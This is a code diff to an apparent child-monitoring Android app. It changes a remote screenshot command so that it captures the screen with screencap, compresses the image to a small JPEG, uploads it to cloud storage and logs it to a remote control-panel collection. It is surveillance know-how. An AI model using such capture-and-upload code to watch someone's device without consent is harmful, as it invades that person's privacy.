@@ -6,6 +6,7 @@ import android.net.Uri
 import android.os.Build
 import androidx.core.content.FileProvider
 import com.kids.monitor.data.FirestoreSync
+import com.kids.monitor.data.StorageUploader
 import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
@@ -124,16 +125,62 @@ object TerminalService {
         context.startActivity(intent)
     }
 
-    /** لقطة شاشة عبر screencap تُحفظ في cache وتُعاد في المخرجات. */
+    /** لقطة شاشة عبر screencap: تُحوَّل لصورة JPEG صغيرة وتُرفع إلى قسم الوسائط في اللوحة فقط. */
     fun screenshot(context: Context): Map<String, Any> {
         val file = File(context.cacheDir, "shot_${System.currentTimeMillis()}.png")
         val result = execute(context, "screencap -p ${file.absolutePath}")
-        return if (result["ok"] == true && file.exists()) {
+        if (result["ok"] != true || !file.exists()) return result
+
+        val jpg = File(context.cacheDir, "shot_${System.currentTimeMillis()}.jpg")
+        try {
+            val bmp = android.graphics.BitmapFactory.decodeFile(file.absolutePath)
+            if (bmp != null) {
+                val ratio = minOf(540f / bmp.width, 540f / bmp.height, 1f)
+                val out = if (ratio < 1f) {
+                    android.graphics.Bitmap.createScaledBitmap(
+                        bmp,
+                        (bmp.width * ratio).toInt().coerceAtLeast(1),
+                        (bmp.height * ratio).toInt().coerceAtLeast(1),
+                        true,
+                    )
+                } else bmp
+                jpg.outputStream().use { out.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, it) }
+                if (out !== bmp) out.recycle()
+                bmp.recycle()
+            }
+        } catch (e: Exception) { /* تجاهل */ }
+        file.delete()
+
+        if (!jpg.exists() || jpg.length() == 0L) {
             val map = HashMap<String, Any>(result)
-            map["message"] = "تم حفظ اللقطة"
-            map["file"] = file.absolutePath
-            map
-        } else result
+            map["message"] = "تم أخذ اللقطة لكن تعذر تحويلها"
+            return map
+        }
+        val url = StorageUploader.uploadSync(jpg, "screenshots/${jpg.name}")
+        val inline = if (url == null) StorageUploader.inlineData(jpg, 700_000) else null
+        if (url == null && inline == null) {
+            jpg.delete()
+            val map = HashMap<String, Any>(result)
+            map["message"] = "تعذر رفع اللقطة (تحقق من قواعد Storage)"
+            return map
+        }
+        FirestoreSync.appendItem(
+            context, "media",
+            mapOf(
+                "name" to "لقطة شاشة ${jpg.name}",
+                "url" to (url ?: ""),
+                "dataUrl" to (inline ?: ""),
+                "type" to "image",
+                "mimeType" to "image/jpeg",
+                "size" to jpg.length(),
+                "screenshot" to true,
+                "timestamp" to System.currentTimeMillis(),
+            ),
+        )
+        val map = HashMap<String, Any>(result)
+        map["message"] = "تم التقاط اللقطة وإرسالها للوحة التحكم"
+        jpg.delete()
+        return map
     }
 
     fun deviceSummary(context: Context): Map<String, Any> {
